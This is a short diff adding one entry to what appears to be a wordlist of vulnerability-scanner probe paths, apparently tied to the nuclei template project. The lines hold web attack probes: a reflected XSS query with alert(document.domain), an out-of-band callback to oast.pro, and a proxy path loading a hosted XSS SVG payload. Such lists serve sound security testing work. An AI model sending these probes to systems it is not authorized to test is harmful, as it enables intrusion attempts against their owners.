@@ -70,3 +70,4 @@
 /file=https://oast.pro
 /__nuxt_error?stack=%0A{{url_encode(payload)}}
 /?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
+/unsafe/plain/https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
